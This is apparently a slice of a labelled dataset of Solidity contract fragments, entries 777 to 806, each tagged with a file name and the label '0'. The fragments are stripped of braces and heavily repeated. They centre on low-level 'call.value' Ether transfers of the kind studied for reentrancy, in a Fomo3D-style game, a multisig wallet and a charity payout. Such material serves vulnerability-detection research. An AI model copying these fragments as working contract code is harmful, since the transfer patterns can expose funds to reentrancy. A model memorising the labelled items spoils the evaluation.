uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
777 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
778 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
779 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
780 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
781 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
782 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
783 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
784 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
785 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
786 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
787 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
788 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
789 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
790 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
791 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
792 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
793 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
794 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
795 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
796 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
797 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
798 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
799 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
800 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
801 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
802 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
803 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
804 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
805 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
806 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
